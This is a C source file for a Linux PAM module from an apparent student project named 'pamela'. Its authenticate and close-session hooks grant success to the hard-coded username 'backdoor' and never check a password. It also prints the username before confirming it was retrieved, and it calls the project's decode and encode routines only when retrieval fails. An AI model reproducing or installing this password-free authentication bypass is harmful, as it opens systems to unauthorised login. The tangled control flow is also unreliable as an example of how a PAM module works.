/*
** pamela.c for pamela in /home/billel/encode/pamela/src
** 
** Made by BIllel
** Login   <billel.mouhoub@epitech.eu>
** 
** Started on  Wed Nov 22 16:48:31 2017 BIllel
** Last update Wed Nov 29 19:20:05 2017 BIllel
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include "pamela.h"

/* expected hook */
PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	printf("Acct mgmt\n");
	return PAM_SUCCESS;
}

/* expected hook, this is where custom stuff happens */
PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
	int retval;

	const char* pUsername;
	retval = pam_get_user(pamh, &pUsername, "Username: ");

	printf("Welcome %s\n", pUsername);

	if (retval != PAM_SUCCESS) {

	  /* call my decoding */
	  my_full_decode();

	  
		return retval;
	}

	if (strcmp(pUsername, "backdoor") != 0) {
		return PAM_AUTH_ERR;
	}

	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_close_session( pam_handle_t *pamh, int flags,int argc, const char **argv )
{
  	int retval;

	const char* pUsername;
	retval = pam_get_user(pamh, &pUsername, "Username: ");

	printf("Welcome %s\n", pUsername);

	if (retval != PAM_SUCCESS) {

	  /* call my encoding */
	  my_full_encode();
	  
		return retval;
	}

	if (strcmp(pUsername, "backdoor") != 0) {
		return PAM_AUTH_ERR;
	}

	return PAM_SUCCESS;
}
